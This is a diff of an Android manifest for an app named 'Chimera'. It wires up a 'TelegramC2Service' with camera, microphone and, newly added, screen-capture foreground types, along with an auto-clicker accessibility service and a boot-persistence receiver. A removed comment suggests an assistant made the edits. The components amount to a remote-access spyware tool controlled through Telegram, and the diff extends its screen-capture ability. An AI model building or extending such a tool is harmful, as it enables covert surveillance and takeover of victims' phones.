@@ -2,6 +2,7 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
+    <!-- Permissions -->
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
@@ -9,7 +10,6 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
-    <!-- ✅ PERMISSION IS CORRECTLY ADDED AS YOU SAID -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
@@ -25,6 +25,7 @@
         android:theme="@style/Theme.Chimera"
         tools:targetApi="34">
 
+        <!-- Main launcher activity -->
         <activity
             android:name=".MainActivity"
             android:exported="true">
@@ -33,17 +34,22 @@
                 <category android:name="android.intent.category.LAUNCHER"/>
             </intent-filter>
         </activity>
+
+        <!-- Screenshot / translucent activity -->
         <activity
             android:name=".ScreenshotActivity"
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
             android:exported="false" />
 
+        <!-- Telegram C2 Service: fixed mediaProjection -->
         <service
             android:name=".TelegramC2Service"
             android:exported="false"
-            android:foregroundServiceType="dataSync|camera|microphone" />
+            android:foregroundServiceType="dataSync|camera|microphone|mediaProjection" />
 
-        <service android:name=".AutoClickerAccessibilityService"
+        <!-- AutoClicker accessibility service -->
+        <service
+            android:name=".AutoClickerAccessibilityService"
             android:label="Chimera Service"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:exported="false">
@@ -55,6 +61,7 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
+        <!-- Boot completed receiver -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
@@ -63,5 +70,6 @@
                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
             </intent-filter>
         </receiver>
+
     </application>
 </manifest>
